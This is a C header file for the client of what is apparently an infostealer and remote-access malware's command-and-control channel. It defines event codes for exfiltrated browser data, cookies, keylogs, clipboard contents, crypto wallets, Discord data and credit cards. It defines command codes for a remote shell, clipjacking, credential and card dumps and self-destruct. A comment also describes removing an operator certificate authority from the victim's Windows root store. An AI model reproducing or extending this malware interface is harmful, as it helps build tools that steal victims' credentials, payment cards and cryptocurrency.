#ifndef C2_CLIENT_H
#define C2_CLIENT_H

#include <stdint.h>
#include <stddef.h>

#define C2_UUID_LEN   16
#define C2_MAX_CMDS    8

/* Event types — must match server store/event.go */
#define EVT_CHECKIN    0x00  /* check-in only: no event stored server-side */
#define EVT_BROWSER    0x01
#define EVT_COOKIES    0x02
#define EVT_SCREENSHOT 0x03
#define EVT_CLIPBOARD  0x04
#define EVT_CRYPTO     0x05
#define EVT_KEYLOG     0x06
#define EVT_DISCORD    0x07
#define EVT_CC         0x08  /* credit cards */

/* Command types — must match server store/command.go */
#define CMD_SHELL         0x01
#define CMD_SCREENSHOT    0x02
#define CMD_BROWSER_DUMP  0x03
#define CMD_CLIPBOARD     0x04
#define CMD_PROC_LIST     0x05
#define CMD_CLIPJACK      0x06
#define CMD_FLUSH_KEYLOG  0x07
#define CMD_DISCORD_DUMP  0x08
#define CMD_DUMP_ALL      0x09
#define CMD_COOKIES_DUMP  0x0A
#define CMD_CC_DUMP       0x0B
#define CMD_CRYPTO_DUMP   0x0C
#define CMD_SELF_DESTRUCT 0xFF

/* Ack status */
#define ACK_OK   0x00
#define ACK_FAIL 0x01

typedef struct {
    uint8_t  uuid[C2_UUID_LEN];
    uint8_t  type;
    uint8_t *payload;
    uint32_t payload_len;
} c2_cmd_t;

int  c2_init(void);
void c2_set_identity(const char *hostname, const char *username);
void c2_untrust_ca(void); /* remove operator CA from CurrentUser\Root at exit */
int  c2_push(uint8_t event_type,
             const char *hostname, const char *username, const char *os_ver,
             const void *payload, uint32_t payload_len);
int  c2_poll(c2_cmd_t *cmds, int max_cmds);
int  c2_ack(const uint8_t uuid[C2_UUID_LEN], uint8_t status,
            const void *result, uint32_t result_len);
void c2_cmd_free(c2_cmd_t *cmd);

#endif /* C2_CLIENT_H */
